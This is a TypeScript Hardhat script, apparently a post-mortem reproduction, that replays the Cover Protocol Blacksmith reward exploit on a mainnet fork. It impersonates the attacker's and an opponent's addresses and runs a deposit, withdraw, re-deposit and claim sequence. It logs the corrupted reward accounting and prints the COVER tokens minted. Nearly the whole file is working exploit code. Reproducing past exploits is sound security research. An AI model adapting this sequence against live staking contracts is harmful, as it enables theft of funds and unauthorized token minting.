import { Blacksmith } from "../typechain-types";
import { ethers, reset, RPC_URL } from "../setup";

import balanceABI from "../abi/BalancerPool.json";

const HACKER = "0x00007569643bc1709561ec2E86F385Df3759e5DD";
const TARGET_POOL = "0x59686E01Aa841f622a43688153062C2f24F8fDed";


const getBlacksmith = async () => {
	return await ethers.getContractAt(
		"Blacksmith",
		"0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5"
	);
};

const logData = async (title: string, blacksmith: Blacksmith) => {
	const poolData = await blacksmith.pools(TARGET_POOL);
	const accRewardsPerToken = poolData[1];
	const [amount, rewardWriteoff] = await blacksmith.miners(
		TARGET_POOL,
		HACKER
	);

	console.log(title);
	console.log(
		"Pool's accRewardsPerToken",
		accRewardsPerToken,
		`(${ethers.formatUnits(accRewardsPerToken, 18)})`
	);
	console.log(
		"Hacker's amount of LP",
		amount,
		`(${ethers.formatUnits(amount, 18)})`
	);
	console.log(
		"Hacker's reward writeoff",
		rewardWriteoff,
		`(${ethers.formatUnits(rewardWriteoff, 18)})`
	);
	console.log("=========\n");
};

async function main() {
    // state of the contract before the first deposit of the hacker
	await reset(RPC_URL, 11542278);

	const hacker = await ethers.getImpersonatedSigner(HACKER);
    const opponent = await ethers.getImpersonatedSigner("0xDF1AeFb979d180b4d67CCA9Abb4c5108C89dC8A4");
	const blacksmith = (await getBlacksmith()).connect(hacker);
	const coverTarget = await blacksmith.cover();
	const coverToken = await ethers.getContractAt("IERC20", coverTarget);

	const pool = new ethers.Contract(TARGET_POOL, balanceABI, ethers.provider);

	const remainingBalance = await pool.balanceOf(blacksmith.target);

	await logData("BEFORE", blacksmith);

	// await time.setNextBlockTimestamp(1609156487);
    await blacksmith.deposit(TARGET_POOL, 15255552810089260015362n);

	// there were a lot of users trying to hack the contract.
	// a user (opponent) withdrew all their funds from the pool after the hacker deposited
	// that's the reason why the contract had balance of LP token = 0 before the attack (except for the hacker's funds)
	await blacksmith.connect(opponent).withdraw(TARGET_POOL, remainingBalance);

	await logData("AFTER OPPONENT WITHDRAW", blacksmith);

	// await time.setNextBlockTimestamp(1609156684);
	await blacksmith.withdraw(TARGET_POOL, 15255552810089260015361n);

	await logData("AFTER WITHDRAW", blacksmith);

	// await time.setNextBlockTimestamp(1609156821);
	await blacksmith.deposit(TARGET_POOL, 15255552810089260015361n);

	await logData("AFTER 2nd DEPOSIT", blacksmith);

	const oldBalance = await coverToken.balanceOf(HACKER);
	// await time.setNextBlockTimestamp(1609156924);
	await blacksmith.claimRewards(TARGET_POOL);
	const newBalance = await coverToken.balanceOf(HACKER);
	const diff = newBalance - oldBalance;

	await logData("AFTER CLAIM", blacksmith);

	console.log("COVER MINTED:", diff, `(${ethers.formatUnits(diff, 18)})`);
}

main();
